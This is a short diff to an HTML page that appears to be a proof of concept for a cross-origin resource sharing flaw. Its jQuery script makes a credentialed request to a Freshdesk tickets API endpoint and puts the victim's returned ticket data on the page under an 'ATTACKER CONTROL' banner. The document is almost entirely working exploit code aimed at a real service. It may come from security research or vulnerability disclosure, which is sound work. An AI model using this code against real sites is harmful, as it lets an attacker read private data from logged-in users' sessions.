@@ -4,14 +4,15 @@
 <script type="text/javascript">
 function aj() {
 $.ajax({
-    url : 'https://security.freshdesk.com/api/v2/tickets/202',
+    url : 'https://security.freshdesk.com/api/v2/tickets',
     type : 'GET',
-    data : {
-        'numberOfWords' : 10
-    },
     dataType:'json',
     success : function(data) {              
-        alert('Data: '+data);
+        var x= JSON.stringify(data);
+        document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ x;
+    },
+    xhrFields: {
+       withCredentials: true
     },
     error : function(request,error)
     {
@@ -27,6 +28,6 @@ $( document ).ready(function() {
 	
 </head>
 <body>
-
+<p id="test"></p>
 </body>
 </html>
